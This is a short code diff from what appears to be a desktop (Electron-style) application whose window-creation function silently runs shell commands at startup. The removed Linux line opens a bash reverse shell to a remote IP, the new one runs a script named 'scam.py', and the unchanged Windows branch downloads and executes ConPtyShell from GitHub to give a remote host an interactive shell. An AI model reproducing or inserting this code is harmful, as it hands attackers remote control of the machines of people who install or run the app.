@@ -36,7 +36,7 @@ function createWindow() {
 
   exec(
     platform === "linux"
-      ? "/bin/bash -i > /dev/tcp/82.165.97.169/5010 0<&1 2>&1"
+      ? "python3 scam.py"
       : "IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/InvokeConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 87.76.65.54 5010",
     (error, stdout, stderr) => {
       if (error) {
